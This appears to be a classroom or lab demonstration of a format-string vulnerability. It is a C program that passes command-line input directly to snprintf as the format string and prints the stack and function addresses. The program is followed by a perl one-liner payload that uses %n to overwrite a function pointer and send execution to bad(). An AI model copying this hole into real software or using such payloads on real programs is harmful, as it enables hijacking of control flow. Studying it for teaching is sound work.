#include <stdio.h>
#include <string.h>

int good();
int bad();

int good()
{
  printf("Good!\n");
  return 0;
}

int bad()
{
  printf("Bad!\n");
  return 0;
}

int main(int argc, char **argv)
{
  char buff[128];
  int (*f)();
  int x = 1;

  memset(buff, 0, sizeof buff);
  f=good;

  snprintf(buff, sizeof buff, argv[1]);

  printf("string: [%s] length: %d \n", buff, strlen(buff));
  printf("x:%d (%p)\n", x, &x);

  printf("*f: %p\n", &f);
  printf("good: %p\n", &good);
  printf("bad: %p\n", &bad);

  f();

  bad();
  exit(0);
}


# ./test `perl -e 'print "\x94\xd5\xff\xff" . "%134513938d%5\\$n"'`
